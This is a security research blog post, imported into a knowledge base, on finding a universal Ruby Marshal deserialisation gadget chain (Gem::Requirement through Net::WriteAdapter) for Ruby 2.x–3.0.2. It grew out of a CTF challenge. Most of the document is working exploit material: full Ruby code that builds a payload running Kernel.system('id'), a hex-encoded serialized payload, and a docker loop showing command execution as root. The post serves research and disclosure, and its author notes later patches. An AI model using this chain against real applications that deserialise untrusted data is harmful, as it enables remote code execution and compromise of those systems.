---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-01-07_universal-deserialisation-gadget-for-ruby-2x-3x.md
original_filename: 2021-01-07_universal-deserialisation-gadget-for-ruby-2x-3x.md
title: Universal Deserialisation Gadget for Ruby 2.x-3.x
category: documents
detected_topics:
- sso
- command-injection
- automation-abuse
- graphql
- api-security
- cloud-security
tags:
- imported
- documents
- sso
- command-injection
- automation-abuse
- graphql
- api-security
- cloud-security
language: en
raw_sha256: 65948c13262ca5420d3ab2c60b21856f9269d830ac90a965cafeff132550ff02
text_sha256: 70122793c56b62e79f6303596b8bac7b00010db68c916d0ac6fb588504f4645a
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# Universal Deserialisation Gadget for Ruby 2.x-3.x

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-01-07_universal-deserialisation-gadget-for-ruby-2x-3x.md
- Source Type: markdown
- Detected Topics: sso, command-injection, automation-abuse, graphql, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `65948c13262ca5420d3ab2c60b21856f9269d830ac90a965cafeff132550ff02`
- Text SHA256: `70122793c56b62e79f6303596b8bac7b00010db68c916d0ac6fb588504f4645a`


## Content

---
title: "Universal Deserialisation Gadget for Ruby 2.x-3.x"
page_title: "Universal Deserialisation Gadget for Ruby 2.x-3.x | devcraft.io"
url: "https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html"
final_url: "https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html"
authors: ["William Bowling / vakzz (@wcbowling)"]
programs: ["Ruby"]
bugs: ["Insecure deserialization", "Security code review", "RCE"]
publication_date: "2021-01-07"
added_date: "2023-08-08"
source: "pentester.land/writeups.json"
original_index: 4019
---

#  Universal Deserialisation Gadget for Ruby 2.x-3.x 

Jan 7, 2021

_Update 2022-04_

This has been patched and so will only works for Ruby 3.0.2 and below:

  * [rubygems/rubygems#141c2f43](https://github.com/rubygems/rubygems/commit/141c2f4388f0f6f81e4d420d73961dbd68f5c08f)
  * [ruby/ruby#2b17d2f2](https://github.com/ruby/ruby/commit/2b17d2f2970d382ac61d15d66f46d1c56f8f2598)

* * *

One of the challenges I wrote for [pbctf 2020](https://ctftime.org/event/1121) involved exploiting deserialisation in a rails app to get code execution and retrieve the flag. The challenge was running with ruby 2.7.2 and rails 6.1, which meant that the existing public gadgets no longer worked and players had to discover a new one.

While researching, I came across a fantastic article published by [elttam](https://twitter.com/elttam) titled [Ruby 2.x Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/). It goes into great detail on how they came up with a universal gadget that did not require anything other than the default gems to be loaded, well worth a read if you haven’t already.

Since the challenge was written using rails, there was a lot more gems and classes to choose from compared to just the defaults. There were a few great solutions to the challenge by players, the one I found combined the original `DeprecatedInstanceVariableProxy` gadget to call the `execute` method on [ActiveModel::AttributeMethods::ClassMethods::CodeGenerator](https://github.com/rails/rails/blob/v6.1.0.rc1/activemodel/lib/active_model/attribute_methods.rb#L369) to achieve code execution.

After the ctf was over I decided to keep looking around to see if I could find another universal gadget, as the `Gem::StubSpecification` gadget used in the elttam article [was patched](https://github.com/ruby/ruby/commit/1eaacb1ef538fe5af2fe231bb340fc39fef67547#diff-5daf0b4d40af647b25014bfbd30abaa25e34bd298d8503c180bb1f59edbdb885) in ruby 2.7+.

I started off trying to find a class to be used as a replacement for `Gem::StubSpecification`, something that allowed for code execution, eval, or the ability to call arbitrary methods. Using the same `autoload` trick in the elttam article and lots of regex searches in RubyMine, I came across [Net::WriteAdapter](https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L458):
  
  
  class WriteAdapter
  def initialize(socket, method)
  @socket = socket
  @method_id = method
  end
  
  def inspect
  "#<#{self.class} socket=#{@socket.inspect}>"
  end
  
  def write(str)
  @socket.__send__(@method_id, str)
  end
  
  alias print write
  
  def <<(str)
  write str
  self
  end
  
  def puts(str = '')
  write str.chomp("\n") + "\n"
  end
  
  def printf(*args)
  write sprintf(*args)
  end
  end
  

It looked very promising as `@socket` and `@method_id` could both be set to anything, and if a way to call any of the methods `write`, `print`, `<<`, `puts` or `printf` could be found it would allow any method to be called on an object.

After many dead ends and a lot more searching I found [Net::BufferedIO](https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L113), which had the following `LOG` method:
  
  
  def read(len, dest = ''.b, ignore_eof = false)
  LOG "reading #{len} bytes..."
  #...
  
  def LOG(msg)
  return unless @debug_output
  @debug_output << msg + "\n"
  end
  
  def eof?
  @io.eof?
  end
  

This was called by both `read` and `readall`, so it could be chained to `Net::WriteAdapter` if a way to call `read` could be found.

I had also started looking for initial/kick-off gadgets, similar to the `Gem::Requirement` one that called `each` in the elttam article. One of the interesting ones found was [Gem::Version](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/version.rb#L275) which allowed calling `to_s` on any object (relevant code):
  
  
  # we can fully control the objects in this array
  def marshal_load(array)
  initialize array[0]
  end
  
  def initialize(version)
  # first thing is the version check
  unless self.class.correct?(version)
  raise ArgumentError, "Malformed version number string #{version}"
  end
  
  version = 0 if version.is_a?(String) && version =~ /\A\s*\Z/
  @version = version.to_s.strip.gsub("-",".pre.")
  @segments = nil
  end
  
  def self.correct?(version)
  unless Gem::Deprecate.skip
  warn "nil versions are discouraged and will be deprecated in Rubygems 4" if version.nil?
  end
  
  # here to_s is called on our object
  !!(version.to_s =~ ANCHORED_VERSION_PATTERN)
  end
  

To find these methods, I slightly modified the existing `marshal_load` method check to quickly see what implemented a function:
  
  
  def check(functions)
  ObjectSpace.each_object(::Class) do |obj|
  all_methods = (obj.instance_methods + obj.private_instance_methods).uniq
  
  functions.each do |function|
  if all_methods.include? function
  method_origin = obj.instance_method(function).inspect[/\((.*)\)/, 1] || obj.to_s
  unless method_origin.nil? || method_origin == ''
  puts obj
  puts "  #{function} defined by #{method_origin}"
  puts "  ancestors = #{obj.ancestors}"
  puts
  end
  end
  end
  end
  end
  

This opened up more options for finding gadgets, as there are quite a few `to_s` methods implemented compared to `marshal_load`. A few examples that were found:

[Gem::Resolver::ActivationRequest](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/resolver/activation_request.rb#L79) which would allow for `name`, `version`, or `platform` to be called on a controllable object:
  
  
  class Gem::Resolver::ActivationRequest
  alias_method :to_s, :full_name
  
  def full_name
  name_tuple.full_name
  end
  
  def name_tuple
  @name_tuple ||= Gem::NameTuple.new(name, version, platform)
  end
  
  def name
  @spec.name
  end
  
  def version
  @spec.version
  end
  
  def platform
  @spec.platform
  end
  

[OptionParser::ParseError](https://github.com/ruby/ruby/blob/v2_7_2/lib/optparse.rb#L2085) which allowed `join` to be called, as well as the `[]` method with a controlled argument:
  
  
  class ParseError < RuntimeError
  def initialize(*args, additional: nil)
  @additional = additional
  @arg0, = args
  @args = args
  @reason = nil
  end
  
  attr_reader :args
  attr_writer :reason
  attr_accessor :additional
  
  alias to_s message
  
  def message
  "#{reason}: #{args.join(' ')}#{additional[@arg0] if additional}"
  end
  
  def reason
  @reason || self.class::Reason
  end
  

I went back to the other end of the gadget chain and started looking for places that called `read` on an object, and eventually discovered [Gem::Package::TarReader](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader.rb#L61) and [Gem::Package::TarHeader](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_header.rb#L103):
  
  
  class Gem::Package::TarReader
  def each
  return enum_for __method__ unless block_given?
  
  use_seek = @io.respond_to?(:seek)
  
  until @io.eof? do
  header = Gem::Package::TarHeader.from @io
  return if header.empty?
  # snip
  end
  end
  
  class Gem::Package::TarHeader
  def self.from(stream)
  header = stream.read 512
  empty = (EMPTY_HEADER == header)
  # snip
  end
  end
  

Since there already was initial gadget to call `each` (thanks to elttam) it looked very promising, a chain such as `Gem::Requirement#marshal_load -> Gem::Package::TarReader#each -> Gem::Package::TarHeader#from -> Net::BufferedIO#read -> Net::BufferedIO#LOG -> Net::WriteAdapter#<<` could be created. This would allow for any method to be called, so long as it accepted a single parameter. Unfortunately, the content of the parameter was not controllable, but it was still a very powerful gadget.

For `TarHeader.from` to be called, a class that had a falsey `eof?` method was needed to pass the conditional. A suitable choice was[Gem::Package::TarReader::Entry](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader/entry.rb#L60) as the result of the `eof?` call was easily controllable:
  
  
  class Gem::Package::TarReader::Entry
  ##
  # Is the tar entry closed?
  
  def closed?
  @closed
  end
  
  ##
  # Are we at the end of the tar entry?
  
  def eof?
  check_closed
  
  @read >= @header.size
  end
  
  def check_closed # :nodoc:
  raise IOError, "closed #{self.class}" if closed?
  end
  

All of this could now be put together, giving the ability to call arbitrary methods on an object:
  
  
  # Autoload the required classes
  Gem::SpecFetcher
  Gem::Installer
  
  # prevent the payload from running when we Marshal.dump it
  module Gem
  class Requirement
  def marshal_dump
  [@requirements]
  end
  end
  end
  
  wa = Net::WriteAdapter.new(Kernel, :vakzz)
  
  io = Gem::Package::TarReader::Entry.allocate
  io.instance_variable_set('@read', 0)
  io.instance_variable_set('@header', "aaa")
  
  n = Net::BufferedIO.allocate
  n.instance_variable_set('@io', io)
  n.instance_variable_set('@debug_output', wa)
  
  t = Gem::Package::TarReader.allocate
  t.instance_variable_set('@io', n)
  
  r = Gem::Requirement.allocate
  r.instance_variable_set('@requirements', t)
  
  
  payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
  puts payload.inspect
  puts Marshal.load(payload)
  
  
  
  Traceback (most recent call last):
  13: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `<main>'
  12: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `load'
  11: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/gems/2.7.0/gems/irb-1.2.6/exe/irb:11:in `<top (required)>'
  10: from (irb):297
  9: from (irb):297:in `load'
  8: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load'
  7: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements'
  6: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each'
  5: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from'
  4: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
  3: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
  2: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
  1: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
  NoMethodError (undefined method `vakzz' for Kernel:Module)
  

The issue was that the argument to the call was not controllable, but now nearly any class and method could be used in the gadget chain. In the original search for ways to call the `Net::WriteAdapter` methods, I had found quite a few that were discarded (due to being unlikely to have ways to call them) which could now be used. One of them was [Gem::RequestSet#resolve](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/request_set.rb#L399):
  
  
  def resolve(set = Gem::Resolver::BestSet.new)
  @sets << set
  @sets << @git_set
  # snip
  end
  

This was perfect as `@sets` and `@git_set` were both fully controllable, and the argument `set` would be assigned the log message `reading 512 bytes...` from the gadget chain. Another `Net::WriteAdapter` gadget could be used for `@sets`, it would end up calling the method with the uncontrolled data first but then again with the controlled `@git_set`.

The final gadget could then be constructed to trigger a call to `Kernel.system("id")`:
  
  
  # Autoload the required classes
  Gem::SpecFetcher
  Gem::Installer
  
  # prevent the payload from running when we Marshal.dump it
  module Gem
  class Requirement
  def marshal_dump
  [@requirements]
  end
  end
  end
  
  wa1 = Net::WriteAdapter.new(Kernel, :system)
  
  rs = Gem::RequestSet.allocate
  rs.instance_variable_set('@sets', wa1)
  rs.instance_variable_set('@git_set', "id")
  
  wa2 = Net::WriteAdapter.new(rs, :resolve)
  
  i = Gem::Package::TarReader::Entry.allocate
  i.instance_variable_set('@read', 0)
  i.instance_variable_set('@header', "aaa")
  
  
  n = Net::BufferedIO.allocate
  n.instance_variable_set('@io', i)
  n.instance_variable_set('@debug_output', wa2)
  
  t = Gem::Package::TarReader.allocate
  t.instance_variable_set('@io', n)
  
  r = Gem::Requirement.allocate
  r.instance_variable_set('@requirements', t)
  
  payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
  puts payload.inspect
  puts Marshal.load(payload)
  
  
  
  sh: reading: command not found
  uid=501(will) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(com.apple.sharepoint.group.2),703(com.apple.sharepoint.group.3),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
  

This gadget works for Ruby 2.x to 3.x and does not require anything other that the default classes to be loaded.
  
  
  for i in `seq -f 2.%g 0 7; echo 3.0`; do echo -n "ruby:${i} - "; docker run --rm -it ruby:${i} ruby -e 'Marshal.load(["04085b08631547656d3a3a5370656346657463686572631347656d3a3a496e7374616c6c6572553a1547656d3a3a526571756972656d656e745b066f3a1c47656d3a3a5061636b6167653a3a546172526561646572063a0840696f6f3a144e65743a3a4275666665726564494f073b076f3a2347656d3a3a5061636b6167653a3a5461725265616465723a3a456e747279073a0a407265616469003a0c40686561646572492208616161063a0645543a124064656275675f6f75747075746f3a164e65743a3a577269746541646170746572073a0c40736f636b65746f3a1447656d3a3a52657175657374536574073a0d406769745f7365744922076964063b0c543a0a40736574736f3b0e073b0f6d0b4b65726e656c3a0f406d6574686f645f69643a0b73797374656d3b133a0c7265736f6c7665"].pack("H*")) rescue nil'; done
  
  ruby:2.0 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.1 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.2 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.3 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.4 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.5 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.6 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:2.7 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
  ruby:3.0 - sh: 1: reading: not found
  uid=0(root) gid=0(root) groups=0(root)
